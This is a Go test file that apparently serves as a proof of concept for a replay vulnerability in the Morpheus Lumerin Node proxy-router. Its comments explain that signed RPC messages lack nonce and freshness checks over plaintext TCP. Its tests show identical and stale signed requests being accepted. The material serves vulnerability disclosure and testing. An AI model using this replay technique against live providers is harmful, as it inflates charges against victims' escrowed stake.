package proxyapi

// PoC for round-20 candidate: MOR-RPC replay (Morpheus Lumerin Node v7.19.0).
//
// Signed consumer -> provider messages carry no nonce, no timestamp-freshness
// check and no request-ID dedup, and the TCP transport is plaintext
// (net.Listen("tcp"), repositories/transport/tcp_server.go:39), so a network
// observer can capture the exact signed bytes and re-deliver them verbatim.
// The provider accepts the replay while the session is live.
//
// Executed here against session.report, the lightest handler that runs
// end-to-end in the test harness. session.prompt and agent.call_tool share
// the identical auth sequence (VerifySignature + isSessionValid, no dedup
// anywhere in proxy-router), so the same replay re-executes inference /
// tool calls: each replayed prompt appends its token counts to the session
// (createCompletionCallback), growing the provider's signed report and hence
// its on-chain claim against the victim's escrowed stake, while the
// completion is delivered to the replayer's own TCP connection.
//
// The stream path is NOT replayable (AppendChunk requires chunkIndex ==
// ChunkCount, CreateSession rejects a duplicate streamID), which is why the
// PoC targets report/prompt instead.

import (
	"context"
	"crypto/ecdsa"
	"encoding/json"
	"math/big"
	"testing"
	"time"

	"github.com/MorpheusAIs/Morpheus-Lumerin-Node/proxy-router/internal/lib"
	msg "github.com/MorpheusAIs/Morpheus-Lumerin-Node/proxy-router/internal/proxyapi/morrpcmessage"
	"github.com/ethereum/go-ethereum/crypto"
	"github.com/stretchr/testify/require"
)

// signRawJSON mirrors MORRPCMessage.generateSignature: sign keccak256 of the
// JSON encoding, no EIP-191 prefix.
func signRawJSON(t *testing.T, v any, key *ecdsa.PrivateKey) []byte {
	t.Helper()
	raw, err := json.Marshal(v)
	require.NoError(t, err)
	hash := crypto.Keccak256Hash(raw)
	sig, err := crypto.Sign(hash.Bytes(), key)
	require.NoError(t, err)
	return sig
}

// TestReplaySessionReportAcceptedTwice delivers the byte-identical signed
// session.report message twice through the controller's normal entrypoint.
// Both deliveries must be rejected if any replay protection existed.
func TestReplaySessionReportAcceptedTwice(t *testing.T) {
	live := big.NewInt(time.Now().Add(2 * time.Hour).Unix())
	c, userKey, sessionID := newReportTestController(t, live)

	// One signed request, exactly as a consumer builds it.
	req, err := c.morRpc.SessionReportRequest(sessionID, lib.HexString(crypto.FromECDSA(userKey)), "req-1")
	require.NoError(t, err)
	wire, err := json.Marshal(req)
	require.NoError(t, err)

	for i := 0; i < 2; i++ {
		var incoming msg.RPCMessage
		require.NoError(t, json.Unmarshal(wire, &incoming))
		var got *msg.RpcResponse
		send := func(r *msg.RpcResponse) error { got = r; return nil }
		require.NoError(t, c.Handle(context.Background(), incoming, lib.NewTestLogger(), send),
			"replay %d of identical signed bytes must be rejected if replay protection existed", i)
		require.NotNil(t, got, "replay %d must produce a response", i)
		require.NotNil(t, got.Result, "replay %d must produce a signed report", i)
	}
}

// TestStaleTimestampSessionReportAccepted signs a request whose timestamp is
// ~6 years old and delivers it. The signature binds the timestamp, but the
// provider never checks freshness (isSessionValid only checks the session's
// own EndsAt), so the stale request is accepted.
func TestStaleTimestampSessionReportAccepted(t *testing.T) {
	live := big.NewInt(time.Now().Add(2 * time.Hour).Unix())
	c, userKey, sessionID := newReportTestController(t, live)

	stale := msg.SessionReportReq{
		Message:   sessionID.Hex(),
		Timestamp: uint64(time.Date(2020, time.January, 1, 0, 0, 0, 0, time.UTC).UnixMilli()),
	}
	stale.Signature = lib.HexString(signRawJSON(t, stale, userKey))
	params, err := json.Marshal(stale)
	require.NoError(t, err)

	incoming := msg.RPCMessage{ID: "req-stale", Method: "session.report", Params: params}
	var got *msg.RpcResponse
	send := func(r *msg.RpcResponse) error { got = r; return nil }
	require.NoError(t, c.Handle(context.Background(), incoming, lib.NewTestLogger(), send),
		"a request timestamped in 2020 must be rejected if freshness were checked")
	require.NotNil(t, got)
	require.NotNil(t, got.Result)
}
